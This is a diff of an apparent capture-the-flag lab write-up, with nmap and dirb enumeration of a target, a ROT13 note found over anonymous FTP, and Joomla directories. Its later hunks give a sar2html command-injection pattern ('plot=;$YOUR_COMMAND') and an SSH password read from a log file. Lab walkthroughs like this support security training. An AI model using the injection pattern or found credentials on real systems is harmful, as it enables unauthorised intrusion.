@@ -1,13 +1,25 @@
+### Enum
 
-port http -> apache
-port ftp:
+> nmap -A $TARGET
+
+on nmapres.txt
+
+* port http -> apache
+
+* port ftp:
 
 ### FTP
 anonymous login:
 
+hidden .info.txt:
+```
 Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl! ----> ROT13 -----> Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
+```
+
+SHM
 
 ---
+
 
 ### Full Enum 
 
@@ -42,16 +54,17 @@ So we cannot exploit it properly
 
 ### CMS
 
-let's investigate port 80 :
+let's dig into port 80 :
 
 > dirb http://$TARGET
 
 ```
+==> DIRECTORY: http://10.10.93.225/joomla/
 ```
 
-joomla.
+Joomla!
 
-	Dig more: dirbres.txt
+Dig more: dirbres.txt
 
 	```
 	==> DIRECTORY: http://10.10.93.225/joomla/_archive/                                                
@@ -62,7 +75,7 @@ joomla.
 
 Some trolling stuff with junk base64s and hashes
 
-also busted _files directory; Nothing there!
+also dug into _files directory; Nothing there!
 ```
 ---- Scanning URL: http://10.10.93.225/joomla/_files/ ----
 + http://10.10.93.225/joomla/_files/index.html (CODE:200|SIZE:168)
@@ -71,6 +84,7 @@ also busted _files directory; Nothing there!
 #### Joomla/_test
 
 Googled sar2html: Remote Command Execution
+
 	* It runs commends over plot (index.php?plot=) parameter
 	* URL injection forman index.php?plot=;$YOUR_COMMAND
 	* command output on select Host <select> element
@@ -83,6 +97,7 @@ so let's ls;
 	```
 	Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
 	```
+	
 found some credintials on ssh ( On port 55007 )
 
 ### SSH
